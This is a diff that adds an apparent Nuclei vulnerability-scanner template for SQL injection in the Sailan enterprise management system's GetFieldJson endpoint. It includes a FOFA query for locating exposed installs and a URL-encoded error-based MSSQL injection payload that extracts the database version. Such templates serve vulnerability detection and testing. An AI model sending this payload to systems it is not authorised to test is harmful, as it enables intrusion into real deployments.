@@ -1,0 +1,32 @@
+id: sailan-GetFieldJson-sql
+
+info:
+  name: 赛蓝企业管理系统 GetFieldJson SQL注入
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: body="/Home6/AdminPretty"
+
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        GET /BaseModule/ExcelImport/GetFieldJson?tableCode=%27%20AND%206935%20IN%20(SELECT%20(CHAR(113)%2BCHAR(122)%2BCHAR(112)%2BCHAR(106)%2BCHAR(113)%2B(SELECT%20(CASE%20WHEN%20(6935%3D6935)%20THEN%20@@VERSION%20ELSE%20CHAR(48)%20END))%2BCHAR(113)%2BCHAR(122)%2BCHAR(113)%2BCHAR(118)%2BCHAR(113)))%20AND%20%27qaq%27=%27qaq HTTP/1.1
+        Host: {{Hostname}}
+        
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '转换成数据类型 int 时失败'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
